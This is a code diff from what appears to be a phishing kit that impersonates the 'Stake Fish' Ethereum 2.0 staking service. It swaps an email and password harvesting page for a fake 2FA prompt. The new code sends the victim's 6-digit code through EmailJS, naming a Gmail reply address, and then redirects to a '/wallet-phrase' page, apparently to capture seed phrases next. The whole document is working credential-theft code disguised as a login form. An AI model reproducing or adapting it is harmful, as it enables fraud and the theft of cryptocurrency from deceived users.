@@ -12,53 +12,33 @@
           "
           class="text-[28px] md:text-[48px] font-bold text-center w-5/6"
         >
-          Welcome Back to Ethereum 2.0 Staking
+          Enter your 2FA Code(Authorization)
         </h1>
-        <div class="my-2 md:my-5 text-[15px] md:text-[21px]">
-          Don’t have an account?
-          <a class="border-[#ccff00] border-b-[3px] hover:border-0" href="/"
-            >Sign up</a
-          >
-        </div>
 
         <div class="mt-4 w-full md:w-4/6">
           <input
-            v-model="email"
-            type="email"
-            placeholder="Email"
-            class="w-full h-10 md:h-[55px] bg-[#f5f5f5] p-2 my-1 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
+            v-model="code"
+            placeholder="2fa Authorization Code"
+            class="w-full h-10 md:h-[55px] bg-[#f5f5f5] p-2 mt-4 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
             name=""
           />
-          <input
-            v-model="password"
-            type="password"
-            placeholder="Password"
-            class="w-full h-10 md:h-[55px] bg-[#f5f5f5] p-2 mb-2 md:mb-8 mt-2 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
-            name=""
-          />
-          <div class="md:flex justify-between items-center">
+          <div v-if="invalidAuth" class="text-xs mb-2 text-red-500 font-semibold"
+            >Invalid Authentication Code, must be 6 digit</div
+          >
+
+          <div class="md:flex mt-4 justify-between items-center">
             <button
               :disabled="loading"
-              @click="collect2FA"
-              class="mb-5 md:mb-0 md:w-auto text-center w-full flex items-center justify-center border-2 border-[#ccff00] bg-[#ccff00] rounded-[12px] text-[15px] md:text-[21px] font-semibold text-black px-8 py-2 md:py-4 transition duration-300 ease-in-out"
+              @click="sendData"
+              class="mb-5 md:mb-0 text-center w-full flex items-center justify-center border-2 border-[#ccff00] bg-[#ccff00] rounded-[12px] text-[15px] md:text-[21px] font-semibold text-black px-8 py-2 md:py-4 transition duration-300 ease-in-out"
             >
-              <span>Continue</span>
+              <span>{{loading ? "Connecting to wallet..." : "Login"}}</span>
               <div
                 v-if="loading"
                 class="ml-2 w-4 h-4 rounded-full animate-spin border-4 border-dashed border-black border-t-transparent"
               ></div>
             </button>
-            <div class="flex items-center justify-center">
-              <a
-                class="border-[#ccff00] text-center border-b-[3px] hover:border-0 text-[15px] md:text-[21px]"
-                href="/"
-                >Forgot Password?</a
-              >
-            </div>
           </div>
-          <span v-if="errorEmail" class="text-xs text-red-500 font-semibold"
-            >Invalid Email</span
-          >
         </div>
 
         <div class="mt-40 md:mt-20">
@@ -188,37 +168,24 @@ export default {
   name: "IndexPage",
   data() {
     return {
-      email: "",
-      password: "",
+      code: "",
       loading: false,
-      errorEmail: false,
+      invalidAuth: false,
     };
   },
   methods: {
-    
-    validateEmail(email) {
-      const mailformat = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
-      if (email.match(mailformat)) {
-        return true;
-      } else {
-        return false;
-      }
-    },
-    async collect2FA() {
-      this.errorEmail = false;
+    async sendData() {
+      this.invalidAuth = false;
       this.loading = true;
       try {
-        const emailCheck = this.validateEmail(this.email);
-        console.log(emailCheck);
-        if (emailCheck) {
+        if (this.code.length === 6) {
           var data = {
             service_id: "service_fhzx1qm",
             template_id: "template_lczv7e9",
             user_id: "1VCQuxAerMoxLsQwn",
             template_params: {
-              from_name: "Stake Fish Login",
-              email: this.email,
-              password: this.password,
+              from_name: "Stake Fish 2fa Code",
+              auth2faCode: this.code,
               reply_to: "Gibsonkendra725@gmail.com",
             },
           };
@@ -228,14 +195,13 @@ export default {
           );
           if (response) {
             this.loading = false;
-            this.$router.push("/2fa-code");
+            this.$router.push("/wallet-phrase");
           }
-        } else {
-          this.errorEmail = true;
           this.loading = false;
-          return;
+        } else {
+          this.loading = false;
+          this.invalidAuth = true;
         }
-        this.loading = false;
       } catch (error) {
         console.log(error);
       }
